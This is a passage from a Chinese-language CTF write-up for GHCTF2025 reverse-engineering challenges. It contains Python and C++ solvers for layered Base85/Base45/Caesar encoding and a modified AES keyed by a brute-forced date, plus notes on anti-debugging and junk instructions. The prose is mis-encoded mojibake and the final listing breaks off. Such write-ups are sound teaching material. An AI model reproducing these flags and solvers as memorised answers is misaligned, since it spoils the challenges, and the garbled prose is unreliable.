RRyyyyyyyyyoooooo += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(RRRRyyyyyooo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SSSooooyyooo</span>(<span class="params">SSSSooyoooooo, SSSSSoyyooooo</span>):</span><br><span class="line">    SSoooooyyyyyyoo = []</span><br><span class="line">    <span class="keyword">for</span> SSSSSSSSSoyooo <span class="keyword">in</span> SSSSooyoooooo:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> &lt;= SSSSSSSSSoyooo &lt;= <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            SSSSoooyooooooo = (<span class="built_in">ord</span>(SSSSSSSSSoyooo) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + SSSSSoyyooooo) % <span class="number">26</span></span><br><span class="line">            SSoooooyyyyyyoo.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + SSSSoooyooooooo))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;0&quot;</span> &lt;= SSSSSSSSSoyooo &lt;= <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            SSSSoooyooooooo = (<span class="built_in">ord</span>(SSSSSSSSSoyooo) - <span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) - SSSSSoyyooooo) % <span class="number">10</span></span><br><span class="line">            SSoooooyyyyyyoo.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) + SSSSoooyooooooo))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            SSoooooyyyyyyoo.append(SSSSSSSSSoyooo)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(SSoooooyyyyyyoo)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºç¬¬ä¸€ä¸ªæ˜¯æ ‡å‡†Base85åŠ å¯†ï¼Œç¬¬äºŒä¸ªæ˜¯Base45åŠ å¯†ï¼Œä½†æ˜¯å’Œæ ‡å‡†çš„è¡¨ä¸ä¸€æ ·ï¼Œç¬¬ä¸‰ä¸ªæ˜¯ç»å…¸çš„å‡¯æ’’åŠ å¯†ã€‚</p><p>è¿™éƒ¨åˆ†å°±æ˜¯Base45å®é™…ç”¨åˆ°çš„è¡¨ã€‚</p><p><code>TABLE = &quot;&quot;.join([chr(i) for i in range(48, 93)])</code></p><p>ç¼–å†™ä¸‰ä¸ªåŠ å¯†çš„è§£å¯†å‡½æ•°ï¼ŒæŒ‰Secretæ–‡ä»¶çš„ä»£ç å¯¹Encæ•°æ®è¿›è¡ŒæŒ‰é¡ºåºè°ƒç”¨è§£å¯†å³å¯å¾—åˆ°Flagã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_encrypt</span>(<span class="params">text, shift</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - shift) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base85_decode</span>(<span class="params">encoded_text</span>):</span><br><span class="line">    byte_data = encoded_text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded = base64.a85decode(byte_data)</span><br><span class="line">    <span class="keyword">return</span> decoded.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base45_decode_custom</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    decoded = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line">    char_to_val = &#123;ch: i <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(chars)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(data):</span><br><span class="line">            num = (char_to_val[data[i + <span class="number">2</span>]] * <span class="number">45</span> * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i + <span class="number">1</span>]] * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i]])</span><br><span class="line">            decoded.append(num &gt;&gt; <span class="number">8</span>)</span><br><span class="line">            decoded.append(num &amp; <span class="number">0xFF</span>)</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = (char_to_val[data[i + <span class="number">1</span>]] * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i]])</span><br><span class="line">            decoded.append(num)</span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> decoded.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    enc = <span class="built_in">bytes</span>([<span class="number">57</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">114</span>, <span class="number">68</span>, <span class="number">56</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">34</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">78</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">63</span>, <span class="number">122</span>, <span class="number">54</span>, <span class="number">33</span>, <span class="number">77</span>, <span class="number">110</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">34</span>, <span class="number">109</span>, <span class="number">106</span>, <span class="number">122</span>, <span class="number">60</span>, <span class="number">92</span>, <span class="number">108</span>, <span class="number">91</span>, <span class="number">61</span>, <span class="number">51</span>, <span class="number">42</span>, <span class="number">62</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">52</span>, <span class="number">67</span>, <span class="number">62</span>, <span class="number">122</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">76</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">51</span>, <span class="number">90</span>])</span><br><span class="line">    </span><br><span class="line">    p1 = caesar_encrypt(enc.decode(),-<span class="number">9</span>)</span><br><span class="line">    p2 = base85_decode(p1)</span><br><span class="line">    p3 = caesar_encrypt(p2,-<span class="number">7</span>)</span><br><span class="line">    flag = base45_decode_custom(p3)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="Flagå€¼-3"><a href="#Flagå€¼-3" class="headerlink" title="Flagå€¼"></a>Flagå€¼</h3><p><code>NSSCTF&#123;Th3y&#39;r3_a11_p1aY_Ba5e!&#125;</code></p><h2 id="TimeSpaceRescue"><a href="#TimeSpaceRescue" class="headerlink" title="TimeSpaceRescue"></a>TimeSpaceRescue</h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™é¢˜è€ƒç‚¹æ˜¯åè°ƒè¯•ã€èŠ±æŒ‡ä»¤ã€æ—¶é—´çˆ†ç ´ã€AESé­”æ”¹ã€‚</p><p>AESé­”æ”¹çš„åœ°æ–¹å¾ˆæ˜æ˜¾ï¼Œå¯¹æ¯”æ ‡å‡†ç®—æ³•ä»£ç å°±å¯ä»¥é©¬ä¸Šæ‰¾å‡ºï¼Œå°±å¤šè°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°å¯¹Keyå’ŒåŠ å¯†æ•°æ®è¿›è¡Œäº†å˜æ¢ã€‚</p><p>IDAåç¼–è¯‘mainå‡½æ•°ï¼Œå‘ç°ä½¿ç”¨ä¸€ä¸ªå‡½æ•°ç”Ÿæˆäº†ä¸€ä¸ªæ•°æ®ï¼Œç„¶åå°†ç”Ÿæˆæ•°æ®ä¸è¾“å…¥å†…å®¹ä¼ å…¥åˆ°åŠ å¯†å‡½æ•°å†…åŠ å¯†ï¼Œæœ€åæ¯”å¯¹ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/22.png" alt="alt text"></p><p>è¿›å…¥ç”Ÿæˆæ•°æ®å‡½æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åè°ƒè¯•ä»£ç ï¼Œæ ¸å¿ƒé€»è¾‘æ˜¯è·å–å½“å‰æ—¶é—´ã€‚</p><p>æ—¶é—´ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨memcpyå°†tm_mdayå¼€å§‹å¾€åä¸‰ä¸ªæ•´æ•°æ•°å€¼å¤åˆ¶åˆ°Srcæ•°ç»„ä¸­ï¼Œä¹Ÿå°±æ˜¯å¤åˆ¶äº†dayã€monthã€yearæ•°æ®ã€‚</p><p>ç„¶åè°ƒç”¨sub_4021A0åˆ©ç”¨å¤åˆ¶çš„æ—¶é—´æ•°æ®ç”Ÿæˆ16å­—èŠ‚æ•°æ®ï¼Œå¯ä»¥è§‚å¯Ÿå¾—çŸ¥sub_4021A0æ˜¯MD5å‡½æ•°ï¼Œå¦‚æœä¸çŸ¥é“çš„è¯ä¹Ÿå¯ä»¥ç›´æ¥æŠŠä»£ç æŠ å‡ºæ¥è¿›è¡Œè°ƒç”¨ã€‚</p><p>æœ€åå°†MD5å¾—åˆ°çš„å­—èŠ‚éƒ½å¼‚æˆ–ä¸Š0x14ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">tm</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tm_sec;  <span class="comment">/*ç§’ï¼Œæ­£å¸¸èŒƒå›´0-59ï¼Œ ä½†å…è®¸è‡³61*/</span></span><br><span class="line">    <span class="type">int</span> tm_min;  <span class="comment">/*åˆ†é’Ÿï¼Œ0-59*/</span></span><br><span class="line">    <span class="type">int</span> tm_hour; <span class="comment">/*å°æ—¶ï¼Œ 0-23*/</span></span><br><span class="line">    <span class="type">int</span> tm_mday; <span class="comment">/*æ—¥ï¼Œå³ä¸€ä¸ªæœˆä¸­çš„ç¬¬å‡ å¤©ï¼Œ1-31*/</span></span><br><span class="line">    <span class="type">int</span> tm_mon;  <span class="comment">/*æœˆï¼Œ ä»ä¸€æœˆç®—èµ·ï¼Œ0-11*/</span></span><br><span class="line">    <span class="type">int</span> tm_year; <span class="comment">/*å¹´ï¼Œ ä»1900è‡³ä»Šå·²ç»å¤šå°‘å¹´*/</span></span><br><span class="line">    <span class="type">int</span> tm_wday; <span class="comment">/*æ˜ŸæœŸï¼Œä¸€å‘¨ä¸­çš„ç¬¬å‡ å¤©ï¼Œ ä»æ˜ŸæœŸæ—¥ç®—èµ·ï¼Œ0-6*/</span></span><br><span class="line">    <span class="type">int</span> tm_yday; <span class="comment">/*ä»ä»Šå¹´1æœˆ1æ—¥åˆ°ç›®å‰çš„å¤©æ•°ï¼ŒèŒƒå›´0-365*/</span></span><br><span class="line">    <span class="type">int</span> tm_isdst;<span class="comment">/*æ—¥å…‰èŠ‚çº¦æ—¶é—´çš„æ——æ ‡*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/GHCTF2025WP/23.png" alt="alt text"></p><p>è¿™è¾¹çœ‹åˆ°å‡½æ•°ç»“å°¾return 39æœ‰ç‚¹å¥‡æ€ªï¼Œè½¬åˆ°è¿™ä¸ªå‡½æ•°æ±‡ç¼–ç•Œé¢ï¼Œä¼šå‘ç°å‡½æ•°åº•éƒ¨æœ‰ä¸ªèŠ±æŒ‡ä»¤ã€‚</p><p>è¿™è¾¹èŠ±æŒ‡ä»¤çš„åŸç†æ˜¯äºŒæ¬¡è®¡ç®—ï¼Œcallå®Œç¬¬ä¸€æ¬¡è®¡ç®—ç»“æœä¸ç­‰äºç›®æ ‡å€¼ï¼Œå‡½æ•°è¿”å›åè¿˜æ˜¯ä»è®¡ç®—åœ°å€æŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼Œè¿›è¡Œäº†ç¬¬äºŒæ¬¡è®¡ç®—ï¼Œæ­¤æ—¶è®¡ç®—ç»“æœç­‰äºç›®æ ‡å€¼è¿›è¡Œjzè·³è½¬ï¼Œç”¨äºŒæ¬¡è®¡ç®—è¯¯å¯¼IDAè®¤ä¸ºè¯¥éƒ¨åˆ†ä¼šç›´æ¥retè€Œä¸ä¼šjzè·³è½¬æ‰§è¡Œä¸‹é¢éƒ¨åˆ†å‘½ä»¤ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/24.png" alt="alt text"></p><p>å°†çº¢æ¡†å†…æ±‡ç¼–nopæ‰ï¼Œé‡æ–°åç¼–è¯‘ä¼šå‘ç°å‡½æ•°å°¾éƒ¨åˆå¤šäº†ä¸€æ¬¡å¼‚æˆ–åŠ å¯†ã€‚</p><p>æ‰€ä»¥è¿™è¾¹çš„å¯†é’¥ç”Ÿæˆå°±æ˜¯åˆ©ç”¨å½“å‰æ—¶é—´çš„å¹´æœˆæ—¥æ•°æ®è¿›è¡ŒMD5ï¼Œç„¶åè¿›è¡Œä¸¤æ¬¡çš„å¼‚æˆ–è®¡ç®—å¾—åˆ°æœ€ç»ˆçš„16å­—èŠ‚å¯†é’¥ï¼Œç»“åˆé¢˜ç›®æè¿°ï¼Œåº”è¯¥æ˜¯éœ€è¦çˆ†ç ´æ—¶é—´æ¥å¾—åˆ°æœ‰æ•ˆå¯†é’¥ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/25.png" alt="alt text"></p><p>æ¥ä¸‹æ¥åˆ†æAESåŠ å¯†å‡½æ•°ï¼Œå‘ç°å‡½æ•°å°¾éƒ¨return 39ï¼Œè¿”å›æ±‡ç¼–è§£å¯†ï¼Œå‘ç°åŒæ ·å‡½æ•°å°¾éƒ¨æœ‰èŠ±æŒ‡ä»¤ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/26.png" alt="alt text"></p><p>nopåå°±ä¼šå‘ç°å°¾éƒ¨æœ‰ä¸ªå¼‚æˆ–0x11çš„æ“ä½œï¼Œè·³åˆ°é‚£ä¸ªå…¨éƒ¨byteçš„äº¤å‰è°ƒç”¨å‡½æ•°ï¼Œå‘ç°æ˜¯åè°ƒè¯•ï¼Œå¦‚æœæ£€æµ‹åˆ°è°ƒè¯•ï¼ŒAESåŠ å¯†å°¾éƒ¨å°±ä¼šæŠŠåŠ å¯†çš„æ•°æ®å†è¿›è¡Œå¼‚æˆ–0x11å¤„ç†ï¼Œè¿›è¡Œæ•°æ®æ··æ·†ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/27.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/28.png" alt="alt text"></p><p>é€šè¿‡æ¯”å¯¹æ ‡å‡†ç®—æ³•é˜Ÿå‡½æ•°è¿›è¡Œå‘½åï¼Œå‘ç°å¤šäº†è¿™ä¸‰ä¸ªéAESæ ‡å‡†æµç¨‹çš„å‡½æ•°ï¼Œ</p><p><img src="/2025/03/06/GHCTF2025WP/29.png" alt="alt text"></p><p>ç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯ä¼ å…¥äº†å¯†é’¥æ•°æ®ï¼Œå°†ç›¸é‚»ä¸¤ä¸ªå­—èŠ‚ä¸¤ä¸¤äº’æ¢å¹¶å¼‚æˆ–ä¸Š5ã€‚ç¬¬ä¸‰ä¸ªå‡½æ•°ä¹Ÿæ˜¯å’Œç¬¬ä¸€ä¸ªç›¸åŒçš„ï¼Œä¸è¿‡å¤„ç†çš„æ˜¯åŠ å¯†å®Œçš„å¯†æ–‡ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/30.png" alt="alt text"></p><p>ç¬¬äºŒä¸ªå‡½æ•°æ˜¯å°†è¦è¿›è¡ŒåŠ å¯†çš„16å­—èŠ‚æ˜æ–‡å­—èŠ‚æ•°æ®å‰åç¿»è½¬ï¼Œå¹¶éƒ½å¼‚æˆ–ä¸Š0xFã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/31.png" alt="alt text"></p><p>è‡³æ­¤æ‰€æœ‰æµç¨‹åˆ†æå®Œæ¯•ï¼Œå¯ä»¥å¤åˆ¶ä¸€ä»½æ ‡å‡†ç®—æ³•ç›´æ¥è¿›è¡Œè§£å¯†ï¼Œä¸è¿‡éœ€è¦æ‰‹åŠ¨è°ƒç”¨é‚£ä¸¤ä¸ªå‡½æ•°è¿›è¡Œå†æ¬¡é€†å‘å¤„ç†ï¼Œç„¶åé…åˆæœˆæ—¥çˆ†ç ´ï¼ˆå¹´ä»½é¢˜ç›®æè¿°å·²ç»™ï¼Œ2024å¹´ï¼‰ã€‚</p><p><strong>æ³¨ï¼šè¯¥ç¨‹åºåœ¨åˆå§‹åŒ–ä¼šè¿›è¡Œä¸‰ä¸ªåè°ƒè¯•å‡½æ•°çš„è°ƒç”¨ï¼Œä¸€ä¸ªæ˜¯è°ƒç”¨IsDebuggerPresentå’ŒCheckRemoteDebuggerPresentï¼Œä¸€ä¸ªæ˜¯åˆšåˆšä¸Šæ–‡æåˆ°çš„ç»™å…¨å±€ä¸€ä¸ªByteèµ‹å€¼ï¼Œæœ€åä¸€ä¸ªæ˜¯å¯¹å½“å‰è¿›ç¨‹éå†æŸ¥æ‰¾æ¶æ„è¿›ç¨‹ï¼Œå¯¹åè°ƒè¯•æ„Ÿå…´è¶£çš„å¯ä»¥æ ¹æ®æˆ‘æä¾›çš„è¿™äº›å‡½æ•°å»åå‘æŸ¥æ‰¾è‡ªè¡Œå¤„ç†è¯•è¯•çœ‹ã€‚</strong></p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;aes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;md5.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Reverse</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_401030</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">15</span>; ; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        result = v3;</span><br><span class="line">        <span class="keyword">if</span> (v3 &gt;= i)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v4 = *(BYTE*)(v3 + a1) ^ <span class="number">0xF</span>;</span><br><span class="line">        *(BYTE*)(v3 + a1) = *(BYTE*)(i + a1) ^ <span class="number">0xF</span>;</span><br><span class="line">        *(BYTE*)(i + a1) = v4;</span><br><span class="line">        ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SwapPairs</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_4010A0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// [esp+7h] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(BYTE*)(i + a1) ^ <span class="number">5</span>;</span><br><span class="line">        *(BYTE*)(i + a1) = *(BYTE*)(i + a1 + <span class="number">1</span>) ^ <span class="number">5</span>;</span><br><span class="line">        *(BYTE*)(i + a1 + <span class="number">1</span>) = v3;</span><br><span class="line">        result = i + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> month = <span class="number">0</span>; month &lt; <span class="number">12</span>; month++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> day = <span class="number">1</span>; day &lt;= <span class="number">31</span>; day++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint8_t</span> EncFlag[] =</span><br><span class="line">            &#123; </span><br><span class="line">                <span class="number">0xCD</span>,<span class="number">0x16</span>,<span class="number">0xDB</span>,<span class="number">0xB5</span>,<span class="number">0xD1</span>,<span class="number">0x02</span>,<span class="number">0xA4</span>,<span class="number">0x82</span>,<span class="number">0x8E</span>,<span class="number">0x59</span>,</span><br><span class="line">                <span class="number">0x73</span>,<span class="number">0x9E</span>,<span class="number">0x96</span>,<span class="number">0x26</span>,<span class="number">0x56</span>,<span class="number">0xF2</span>,<span class="number">0x16</span>,<span class="number">0x8E</span>,<span class="number">0x46</span>,<span class="number">0xF2</span>,</span><br><span class="line">                <span class="number">0x55</span>,<span class="number">0x7B</span>,<span class="number">0x92</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0xDC</span>,<span class="number">0xAA</span>,<span class="number">0x8A</span>,<span class="number">0xF3</span>,<span class="number">0x1C</span>,</span><br><span class="line">                <span class="number">0xA0</span>,<span class="number">0xAA</span> </span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">uint8_t</span> Key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">            <span class="type">int</span> TimeData[]&#123; day,month,<span class="number">2024</span> - <span class="number">1900</span> &#125;;</span><br><span class="line">            <span class="built_in">md5</span>((<span class="type">uint8_t</span>*)TimeData, <span class="number">12</span>, Key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                *(Key + i) = (Key[i] ^ <span class="number">0x114</span>) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                *(Key + i) = (Key[i] ^ <span class="number">0x11</span>) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// swap key</span></span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)Key);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// swap encData</span></span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)EncFlag);</span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)(EncFlag + <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// decrypt</span></span><br><span class="line">            <span class="built_in">aesDecrypt</span>(Key, <span class="number">16</span>, EncFlag, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// reverse encData</span></span><br><span class="line">            <span class="built_in">sub_401030</span>((<span class="type">int</span>)EncFlag);</span><br><span class="line">            <span class="built_in">sub_401030</span>((<span class="type">int</span>)(EncFlag + <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (EncFlag[<span class="number">0</span>] == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                &amp;&amp; EncFlag[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span></span><br><span class="line">                &amp;&amp; EncFlag[<span class="number">2</span>] == <span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, EncFlag);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span 